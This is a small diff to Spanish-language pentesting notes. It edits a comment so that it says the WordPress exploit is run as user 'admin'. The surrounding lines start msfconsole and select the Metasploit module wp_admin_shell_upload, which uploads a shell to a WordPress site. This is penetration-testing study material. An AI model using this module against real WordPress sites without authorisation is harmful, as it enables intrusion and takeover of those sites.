@@ -30,7 +30,7 @@ Si ya tenemos una sesión activa como root, podemos usar el siguiente modulo par
 ## WordPress
 
 ```bash 
-# Explotaremos WordPress
+# Explotaremos WordPress siendo el usuario 'admin'
 ❯ msfconsole -q                  # q = Quitar el banner de inicio
 
 	❯ use exploit/unix/webapp/wp_admin_shell_upload         # Usamos el exploit                
